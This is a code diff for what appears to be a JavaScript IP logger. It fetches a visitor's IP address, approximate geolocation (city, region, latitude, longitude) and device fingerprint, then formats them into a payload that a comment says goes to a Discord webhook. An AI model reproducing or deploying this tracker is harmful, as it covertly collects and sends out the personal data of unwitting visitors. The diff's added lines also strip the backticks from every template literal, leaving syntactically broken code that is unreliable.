@@ -16,7 +16,7 @@
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
                 const { ip } = await response.json();
-                const locationResponse = await fetch(`https://ip-api.com/json/${ip}`);
+                const locationResponse = await fetch(https://ip-api.com/json/${ip});
                 const locationData = await locationResponse.json();
 
                 return {
@@ -41,21 +41,21 @@
             let os = 'Unknown';
             if (/windows nt/i.test(userAgent)) {
                 const versionMatch = userAgent.match(/windows nt (\d+\.\d+)/i);
-                os = versionMatch ? `Windows ${versionMatch[1]}` : 'Windows';
+                os = versionMatch ? Windows ${versionMatch[1]} : 'Windows';
             } else if (/mac os x/i.test(userAgent)) {
                 const versionMatch = userAgent.match(/mac os x (\d+_\d+)/i);
-                os = versionMatch ? `macOS ${versionMatch[1].replace('_', '.')}` : 'macOS';
+                os = versionMatch ? macOS ${versionMatch[1].replace('_', '.')} : 'macOS';
             } else if (/linux/i.test(userAgent)) {
                 os = 'Linux';
             } else if (/android/i.test(userAgent)) {
                 const versionMatch = userAgent.match(/android (\d+\.\d+)/i);
-                os = versionMatch ? `Android ${versionMatch[1]}` : 'Android';
+                os = versionMatch ? Android ${versionMatch[1]} : 'Android';
             } else if (/iphone|ipad|ipod/i.test(userAgent)) {
                 const versionMatch = userAgent.match(/os (\d+_\d+)/i);
-                os = versionMatch ? `iOS ${versionMatch[1].replace('_', '.')}` : 'iOS';
+                os = versionMatch ? iOS ${versionMatch[1].replace('_', '.')} : 'iOS';
             }
 
-            return `
+            return 
                 User-Agent: ${userAgent}
                 Platform: ${platform}
                 Language: ${language}
@@ -63,7 +63,7 @@
                 OS: ${os}
                 Color Depth: ${colorDepth}
                 Cookies Enabled: ${cookiesEnabled}
-            `;
+            ;
         }
 
         // Function to send data to Discord webhook
@@ -73,7 +73,7 @@
             const timestamp = new Date().toLocaleString();
 
             const locationDetails = location
-                ? `
+                ? 
                 City: ${location.city}
                 Region: ${location.regionName}
                 Country: ${location.country}
@@ -81,7 +81,7 @@
                 Timezone: ${location.timezone}
                 Latitude: ${location.lat}
                 Longitude: ${location.lon}
-                `
+                
                 : 'Location information unavailable';
 
             const payload = {
@@ -90,10 +90,10 @@
                     color: 3447003,
                     fields: [
                         { name: "IP Address", value: ip, inline: true },
-                        { name: "Device Info", value: `\`\`\`${deviceInfo}\`\`\`` },
-                        { name: "Approximate Location", value: `\`\`\`${locationDetails}\`\`\`` }
+                        { name: "Device Info", value: \\\${deviceInfo}\\\` },
+                        { name: "Approximate Location", value: \\\${locationDetails}\\\` }
                     ],
-                    footer: { text: `Logged at: ${timestamp}` }
+                    footer: { text: Logged at: ${timestamp} }
                 }]
             };
 
